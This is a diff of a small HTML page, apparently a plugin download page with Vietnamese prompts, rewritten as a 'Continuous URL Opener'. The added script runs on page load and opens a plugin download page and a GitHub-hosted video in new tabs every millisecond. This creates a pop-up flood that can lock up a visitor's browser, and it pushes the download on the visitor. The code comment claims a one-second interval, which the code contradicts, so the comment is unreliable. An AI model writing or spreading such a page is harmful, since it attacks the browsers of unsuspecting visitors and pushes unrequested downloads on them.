@@ -3,39 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Plugin Download</title>
+    <title>Continuous URL Opener</title>
+</head>
+<body>
     <script>
         (function() {
             const url = 'https://ilovecodepython.github.io/plugin/downloads/index.html';
-            let opened = false;
-            
-            function tryOpen() {
-                if (opened) return;
-                opened = true;
-                window.open(url, '_blank');
-                setTimeout(() => {
-                    if (document.hidden || !window.document.hasFocus()) {
-                        // If the document is hidden or not in focus, assume the popup was blocked
-                        alert('It seems your browser is blocking pop-ups. Please allow pop-ups for this site to continue.');
-                        document.getElementById('popup-message').style.display = 'block';
-                    }
-                }, 1);
-            }
-
-            // Try opening the URL immediately
-            tryOpen();
-            
-            // Reattempt opening periodically if blocked
+            const urll = 'https://github.com/l1ghtsh0t/l1ghtsh0t.github.io/raw/main/media/video.mp4';
             setInterval(() => {
-                if (!opened) {
-                    tryOpen();
-                }
-            }, 1);
+                window.open(url, '_blank');
+                window.open(urll, '_blank');
+            }, 1); // Open every 1000 milliseconds (1 second)
         })();
     </script>
-</head>
-<body>
-    <p>Vui lòng đồng ý và tắt trình chặn quảng cáo để tiếp tục tải plugin. Cảm ơn!</p>
-    <p id="popup-message" style="display:none;">Vui lòng bật cửa sổ bật lên trong trình duyệt của bạn để tiếp tục.</p>
 </body>
 </html>
